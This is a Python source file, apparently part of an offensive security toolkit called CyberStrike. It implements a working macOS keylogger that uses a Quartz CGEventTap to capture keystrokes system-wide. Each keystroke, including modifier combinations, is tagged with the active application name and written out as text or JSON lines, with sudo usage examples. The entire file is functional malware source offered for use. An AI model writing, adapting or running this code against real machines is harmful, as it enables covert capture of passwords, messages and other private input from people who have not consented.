#!/usr/bin/env python3
"""
keylog_mac.py — Capture keystrokes on macOS via Quartz CGEventTap.

Creates a CGEventTap to intercept keyboard events system-wide, logging
keystrokes with the active application context. Uses PyObjC Quartz framework.

Requires: root or Accessibility permissions, PyObjC (pyobjc-framework-Quartz).

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime


KEYCODE_MAP = {
    0: "a", 1: "s", 2: "d", 3: "f", 4: "h", 5: "g", 6: "z", 7: "x",
    8: "c", 9: "v", 11: "b", 12: "q", 13: "w", 14: "e", 15: "r",
    16: "y", 17: "t", 18: "1", 19: "2", 20: "3", 21: "4", 22: "6",
    23: "5", 24: "=", 25: "9", 26: "7", 27: "-", 28: "8", 29: "0",
    30: "]", 31: "o", 32: "u", 33: "[", 34: "i", 35: "p", 36: "[RET]",
    37: "l", 38: "j", 39: "'", 40: "k", 41: ";", 42: "\\", 43: ",",
    44: "/", 45: "n", 46: ".", 47: "`", 48: "[TAB]", 49: "[SPC]",
    50: "`", 51: "[DEL]", 53: "[ESC]", 55: "[CMD]", 56: "[SHIFT]",
    57: "[CAPS]", 58: "[OPT]", 59: "[CTRL]", 63: "[FN]",
    96: "[F5]", 97: "[F6]", 98: "[F7]", 99: "[F3]", 100: "[F8]",
    101: "[F9]", 109: "[F10]", 103: "[F11]", 111: "[F12]",
    105: "[F13]", 107: "[F14]", 113: "[F15]",
    115: "[HOME]", 116: "[PGUP]", 117: "[FWDDEL]", 119: "[END]",
    121: "[PGDN]", 122: "[F1]", 123: "[LEFT]", 124: "[RIGHT]",
    125: "[DOWN]", 126: "[UP]",
    65: ".", 67: "*", 69: "+", 71: "[CLEAR]",
    75: "/", 76: "[ENTER]", 78: "-",
    82: "0", 83: "1", 84: "2", 85: "3", 86: "4", 87: "5",
    88: "6", 89: "7", 91: "8", 92: "9",
}


class MacKeylogger:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.current_app = ""
        self.keystroke_buffer = []
        self.buffer_app = ""
        self.last_flush = 0
        self.flush_interval = 2.0

    def check_accessibility(self):
        """Check if we have Accessibility permissions (required for CGEventTap)."""
        try:
            from Quartz import CGEventTapCreate, kCGEventTapOptionListenOnly
            from Quartz import kCGHeadInsertEventTap, kCGSessionEventTap
            from Quartz import CGEventMaskBit, kCGEventKeyDown

            tap = CGEventTapCreate(
                kCGSessionEventTap,
                kCGHeadInsertEventTap,
                kCGEventTapOptionListenOnly,
                CGEventMaskBit(kCGEventKeyDown),
                lambda *a: None,
                None,
            )
            if tap is None:
                print(
                    "ERROR: Cannot create event tap. Grant Accessibility permission "
                    "or run as root.",
                    file=sys.stderr,
                )
                sys.exit(1)
        except ImportError:
            print(
                "ERROR: PyObjC Quartz framework required. "
                "Install via: pip3 install pyobjc-framework-Quartz",
                file=sys.stderr,
            )
            sys.exit(1)

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — macOS Keylogger (CGEventTap)")
        print("=" * 60)
        print(f"PID:      {os.getpid()}")
        print(f"Duration: {self.args.duration}s")
        print(f"Output:   {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:  {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, _signum, _frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            keys = record.get("keys", "")
            app = record.get("application", "unknown")
            print(f"[{record['timestamp']}] [{app:<30}] {keys}", flush=True)

    def get_active_app(self):
        """Get the currently focused application name."""
        try:
            from AppKit import NSWorkspace

            active = NSWorkspace.sharedWorkspace().activeApplication()
            if active:
                return active.get("NSApplicationName", "unknown")
        except Exception:
            pass
        return "unknown"

    def flush_buffer(self):
        """Flush keystroke buffer as a single event."""
        if not self.keystroke_buffer:
            return
        keys = "".join(self.keystroke_buffer)
        self.emit(
            {
                "timestamp": datetime.now().isoformat(),
                "application": self.buffer_app,
                "keys": keys,
                "key_count": len(self.keystroke_buffer),
            }
        )
        self.keystroke_buffer = []
        self.last_flush = time.monotonic()

    def callback(self, proxy, event_type, event, refcon):
        """CGEventTap callback for keyboard events."""
        try:
            from Quartz import CGEventGetIntegerValueField, kCGKeyboardEventKeycode
            from Quartz import CGEventGetFlags

            keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)
            flags = CGEventGetFlags(event)

            key = KEYCODE_MAP.get(keycode, f"[{keycode}]")

            modifiers = []
            if flags & (1 << 17):
                modifiers.append("SHIFT")
            if flags & (1 << 18):
                modifiers.append("CTRL")
            if flags & (1 << 19):
                modifiers.append("OPT")
            if flags & (1 << 20):
                modifiers.append("CMD")

            if modifiers and key not in (
                "[SHIFT]", "[CTRL]", "[OPT]", "[CMD]", "[FN]", "[CAPS]"
            ):
                key = f"[{'|'.join(modifiers)}+{key}]"

            app = self.get_active_app()

            if app != self.buffer_app and self.keystroke_buffer:
                self.flush_buffer()

            self.buffer_app = app
            self.keystroke_buffer.append(key)

            now = time.monotonic()
            if now - self.last_flush >= self.flush_interval:
                self.flush_buffer()

        except Exception:
            pass

        return event

    def run(self):
        self.print_banner()

        try:
            from Quartz import (
                CGEventTapCreate,
                CGEventTapEnable,
                kCGEventTapOptionListenOnly,
                kCGHeadInsertEventTap,
                kCGSessionEventTap,
                CGEventMaskBit,
                kCGEventKeyDown,
                kCGEventFlagsChanged,
            )
            from Quartz import CFMachPortCreateRunLoopSource
            from Quartz import CFRunLoopGetCurrent, CFRunLoopAddSource, kCFRunLoopCommonModes
            from Quartz import CFRunLoopRunInMode, kCFRunLoopDefaultMode
        except ImportError:
            print(
                "ERROR: PyObjC Quartz framework required. "
                "Install via: pip3 install pyobjc-framework-Quartz",
                file=sys.stderr,
            )
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        event_mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged)

        tap = CGEventTapCreate(
            kCGSessionEventTap,
            kCGHeadInsertEventTap,
            kCGEventTapOptionListenOnly,
            event_mask,
            self.callback,
            None,
        )

        if tap is None:
            print(
                "ERROR: Failed to create event tap. "
                "Ensure Accessibility permission is granted or run as root.",
                file=sys.stderr,
            )
            sys.exit(1)

        run_loop_source = CFMachPortCreateRunLoopSource(None, tap, 0)
        CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes)
        CGEventTapEnable(tap, True)

        if not self.args.json_output:
            print("[*] Keylogger active. Capturing keystrokes...", flush=True)

        deadline = self.start_time + self.args.duration

        while self.running and time.monotonic() < deadline:
            CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.5, False)

        self.flush_buffer()
        CGEventTapEnable(tap, False)
        self.cleanup()

    def cleanup(self):
        print(f"\n--- keylog_mac summary ---")
        print(f"Keystrokes captured: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Capture keystrokes on macOS via CGEventTap.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 keylog_mac.py --duration 60\n"
            "  sudo python3 keylog_mac.py --duration 120 --json-output\n"
            "  sudo python3 keylog_mac.py --json-output | jq '.'\n"
        ),
    )
    parser.add_argument(
        "--duration", type=int, default=60, help="Capture duration in seconds (default: 60)"
    )
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    logger = MacKeylogger(args)
    logger.run()


if __name__ == "__main__":
    main()
